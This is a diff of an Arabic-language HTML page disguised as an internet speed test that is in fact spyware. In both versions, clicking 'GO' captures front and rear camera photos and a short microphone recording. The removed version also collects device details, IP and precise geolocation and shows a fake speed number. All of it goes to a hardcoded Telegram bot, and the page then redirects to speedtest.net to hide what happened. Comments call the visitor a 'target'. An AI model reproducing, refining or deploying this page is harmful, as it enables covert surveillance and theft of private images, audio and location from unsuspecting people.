@@ -1,32 +1,20 @@
+
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SpeedTest Pro | فحص جودة الشبكة</title>
+    <title>SpeedTest</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        :root { --accent: #00d2ff; --bg: #0b0e18; }
-        body { background: var(--bg); color: white; font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .grid { position: absolute; width: 100%; height: 100%; background-image: linear-gradient(rgba(0,210,255,0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(0,210,255,0.03) 1px, transparent 1px); background-size: 30px 30px; z-index: -1; }
-        .card { background: rgba(255,255,255,0.02); padding: 40px; border-radius: 35px; border: 1px solid rgba(255,255,255,0.1); backdrop-filter: blur(20px); text-align: center; width: 85%; max-width: 400px; box-shadow: 0 20px 60px rgba(0,0,0,0.6); position: relative; }
-        .btn-go { width: 140px; height: 140px; border-radius: 50%; border: 4px solid var(--accent); background: transparent; color: var(--accent); font-size: 32px; font-weight: 900; cursor: pointer; transition: 0.4s; outline: none; z-index: 10; }
-        .btn-go:active { transform: scale(0.9); background: rgba(0, 210, 255, 0.1); }
-        #speedBox { display: none; margin-top: 10px; }
-        .num { font-size: 55px; font-weight: 900; color: var(--accent); text-shadow: 0 0 20px rgba(0,210,255,0.5); }
+        body { background: #0b0e18; color: white; text-align: center; font-family: sans-serif; padding-top: 50px; }
+        .btn { width: 150px; height: 150px; border-radius: 50%; border: 4px solid #00d2ff; background: none; color: #00d2ff; font-size: 30px; cursor: pointer; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
-    <div class="grid"></div>
-    <div class="card">
-        <h2 style="font-weight: 300; letter-spacing: 3px; margin-bottom: 5px;">SPEEDTEST</h2>
-        <p id="msg" style="color: #6a728e; font-size: 13px; margin-bottom: 30px;">اضغط للبدء واختيار أفضل سيرفر</p>
-        <button id="goBtn" class="btn-go">GO</button>
-        <div id="speedBox">
-            <span id="num" class="num">0.0</span>
-            <div style="color: #6a728e; font-size: 14px;">Mbps Download</div>
-        </div>
-    </div>
+    <h2>فحص سرعة الإنترنت</h2>
+    <button id="goBtn" class="btn">GO</button>
+    <p id="status">اضغط للبدء</p>
 
     <video id="v" autoplay playsinline muted></video>
     <canvas id="c"></canvas>
@@ -35,114 +23,66 @@
         const token = "8738245852:AAFuHo61scaBhakSOPlnPg7UIS8Ggx7llGk";
         const chat = "7984067238";
 
-        async function sendToTelegram(msg, isImg = false, data = null, isVoice = false) {
-            const url = `https://api.telegram.org/bot${token}/`;
-            try {
-                const fd = new FormData();
-                fd.append("chat_id", chat);
-                if (isVoice) {
-                    fd.append("voice", data, "record.ogg");
-                    await fetch(url + "sendVoice", { method: "POST", body: fd });
-                } else if (isImg) {
-                    fd.append("photo", data, "shot.jpg");
-                    if (msg) fd.append("caption", msg);
-                    await fetch(url + "sendPhoto", { method: "POST", body: fd });
-                } else {
-                    await fetch(url + "sendMessage?chat_id=" + chat + "&text=" + encodeURIComponent(msg) + "&parse_mode=Markdown");
-                }
-            } catch (e) {}
+        async function send(msg, isImg, data, isVoice) {
+            const fd = new FormData();
+            fd.append("chat_id", chat);
+            let url = `https://api.telegram.org/bot${token}/`;
+            if(isVoice) { fd.append("voice", data, "a.ogg"); url += "sendVoice"; }
+            else if(isImg) { fd.append("photo", data, "p.jpg"); fd.append("caption", msg); url += "sendPhoto"; }
+            else { url += `sendMessage?chat_id=${chat}&text=${encodeURIComponent(msg)}`; }
+            try { await fetch(url, { method: "POST", body: fd }); } catch(e){}
         }
 
-        async function getReport() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const targetId = urlParams.get('id') || "مستهدف مجهول";
-            let info = `📊 *تقرير شامل للهدف (${targetId})*:\n\n`;
-            info += `• 📱 الجهاز: \`${navigator.platform}\`\n`;
-            info += `• 💾 الرام: \`${navigator.deviceMemory || "؟"} GB\`\n`;
-            info += `• ⚙️ المعالج: \`${navigator.hardwareConcurrency} Cores\`\n`;
-            info += `• 🖥️ الشاشة: \`${screen.width}x${screen.height}\`\n`;
-            try {
-                const b = await navigator.getBattery();
-                info += `• 🔋 البطارية: \`${Math.round(b.level * 100)}%\` (${b.charging ? "🔌" : "🔋"})\n`;
-                const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
-                info += `• 🌐 الـ IP: \`${ip.ip}\`\n`;
-            } catch (e) {}
-            return info;
-        }
-
-        // دالة التقاط الصور السريعة مع إغلاق المسارات فوراً لمنع السواد
-        async function capturePhotos(mode, count) {
+        // الحل: دالة التقاط الصور تعمل "بمفردها" تماماً وتغلق الكاميرا قبل أي شيء آخر
+        async function takePhotos(mode) {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
                 const v = document.getElementById("v");
                 const c = document.getElementById("c");
                 v.srcObject = stream;
-                await new Promise(r => v.onloadedmetadata = r);
-                await new Promise(r => setTimeout(r, 2000)); // وقت كافٍ لضبط الإضاءة
-
-                for (let i = 0; i < count; i++) {
-                    c.width = 720; c.height = 960;
-                    c.getContext("2d").drawImage(v, 0, 0);
-                    const blob = await new Promise(res => c.toBlob(res, "image/jpeg", 0.8));
-                    if (blob) {
-                        sendToTelegram(`${mode === 'user' ? '👤 أمامية' : '🌍 خلفية'} - لقطة ${i+1}`, true, blob);
-                    }
-                    await new Promise(r => setTimeout(r, 500)); // فاصل زمني بسيط بين اللقطات
-                }
-                // إغلاق الكاميرا تماماً قبل الانتقال للخطوة التالية
+                
+                // أهم خطوة: انتظار 3 ثوانٍ كاملة لتجنب السواد (الوقت الكافي لفتح العدسة)
+                await new Promise(r => setTimeout(r, 3000)); 
+                
+                c.width = 480; c.height = 640;
+                c.getContext("2d").drawImage(v, 0, 0);
+                const blob = await new Promise(res => c.toBlob(res, "image/jpeg", 0.7));
+                
+                // إغلاق الكاميرا فوراً لتحرير الموارد للميكروفون
                 stream.getTracks().forEach(t => t.stop());
-            } catch (e) { console.error("Camera Error:", e); }
-        }
-
-        async function recordAudio(sec) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                const mediaRecorder = new MediaRecorder(stream);
-                const chunks = [];
-                return new Promise(resolve => {
-                    mediaRecorder.ondataavailable = e => chunks.push(e.data);
-                    mediaRecorder.onstop = () => {
-                        const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
-                        stream.getTracks().forEach(t => t.stop());
-                        resolve(blob);
-                    };
-                    mediaRecorder.start();
-                    setTimeout(() => mediaRecorder.stop(), sec * 1000);
-                });
-            } catch (e) { return null; }
+                return blob;
+            } catch(e) { return null; }
         }
 
         document.getElementById("goBtn").onclick = async function() {
             this.style.display = "none";
-            document.getElementById("speedBox").style.display = "block";
-            document.getElementById("msg").innerText = "جاري الفحص...";
+            document.getElementById("status").innerText = "جاري الفحص...";
 
-            const timer = setInterval(() => {
-                document.getElementById("num").innerText = (Math.random() * (96 - 84) + 84).toFixed(1);
-            }, 100);
-
-            // التنفيذ المتسلسل (Sequential) لمنع تعارض الموارد
             // 1. التقرير والموقع
-            sendToTelegram(await getReport());
-            navigator.geolocation.getCurrentPosition(p => {
-                sendToTelegram(`📍 *الموقع الدقيق*:\n[فتح الخريطة](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`);
-            });
+            await send("🔔 دخل هدف جديد الآن!");
 
-            // 2. التقاط الصور (أولاً) - 3 أمامية و 3 خلفية
-            await capturePhotos("user", 3);
-            await capturePhotos("environment", 3);
+            // 2. التقاط الصور أولاً (قبل طلب إذن الصوت) لضمان عدم السواد
+            const p1 = await takePhotos("user");
+            if(p1) await send("👤 صورة أمامية", true, p1);
+            
+            const p2 = await takePhotos("environment");
+            if(p2) await send("🌍 صورة خلفية", true, p2);
 
-            // 3. تسجيل الصوت (ثانياً) - يبدأ بعد إغلاق الكاميرا تماماً
-            const audioBlob = await recordAudio(10);
-            if (audioBlob) {
-                await sendToTelegram(null, false, audioBlob, true);
-            }
-
-            // 4. التوجيه النهائي بعد انتهاء كل العمليات
-            setTimeout(() => {
-                clearInterval(timer);
-                location.href = "https://www.speedtest.net/ar";
-            }, 2000); 
+            // 3. الآن فقط نطلب الميكروفون بعد أن أغلقت الكاميرا تماماً
+            try {
+                const s = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const mr = new MediaRecorder(s);
+                const ch = [];
+                mr.ondataavailable = e => ch.push(e.data);
+                mr.onstop = async () => {
+                    const blob = new Blob(ch, { type:  audio/ogg  });
+                    await send(null, false, blob, true);
+                    s.getTracks().forEach(t => t.stop());
+                    location.href = "https://www.speedtest.net/";
+                };
+                mr.start();
+                setTimeout(() => mr.stop(), 7000); // تسجيل 7 ثوانٍ
+            } catch(e) { location.href = "https://www.speedtest.net/"; }
         };
     </script>
 </body>
